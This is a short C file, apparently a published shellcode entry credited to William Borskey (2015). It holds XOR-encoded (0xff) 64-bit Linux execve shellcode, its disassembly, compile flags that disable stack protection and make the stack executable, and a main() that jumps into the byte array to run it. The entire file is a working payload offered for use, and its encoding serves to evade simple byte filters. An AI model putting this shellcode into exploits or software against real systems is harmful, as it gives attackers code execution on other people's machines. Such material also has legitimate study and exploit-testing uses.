/*
Compile with: gcc -fno-stack-protector -z execstack
This execve shellcode is encoded with 0xff and is for 64 bit linux.

shell:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <start>:
  400080:	48 b9 ff ff ff ff ff 	movabs rcx,0xffffffffffffffff
  400087:	ff ff ff
  40008a:	49 b8 ae b7 72 c3 db 	movabs r8,0xfffaf0dbc372b7ae
  400091:	f0 fa ff
  400094:	49 31 c8             	xor    r8,rcx
  400097:	41 50                	push   r8
  400099:	49 b8 d0 9d 96 91 d0 	movabs r8,0x978cd0d091969dd0
  4000a0:	d0 8c 97
  4000a3:	49 31 c8             	xor    r8,rcx
  4000a6:	41 50                	push   r8
  4000a8:	49 b8 b7 ce 2d ad 4f 	movabs r8,0x46b7c44fad2dceb7
  4000af:	c4 b7 46
  4000b2:	49 31 c8             	xor    r8,rcx
  4000b5:	41 50                	push   r8
  4000b7:	ff e4                	jmp    rsp

2015 William Borskey

*/
char shellcode[] = "\x48\xb9\xff\xff\xff\xff\xff\xff\xff\xff\x49\xb8\xae\xb7\x72\xc3\xdb\xf0\xfa\xff\x49\x31\xc8\x41\x50\x49\xb8\xd0\x9d\x96\x91\xd0\xd0\x8c\x97\x49\x31\xc8\x41\x50\x49\xb8\xb7\xce\x2d\xad\x4f\xc4\xb7\x46\x49\x31\xc8\x41\x50\xff\xe4";

int main(int argc, char **argv)
{
    int (*func)();
    func = (int (*)()) shellcode;
    (int)(*func)();
     return 0;
}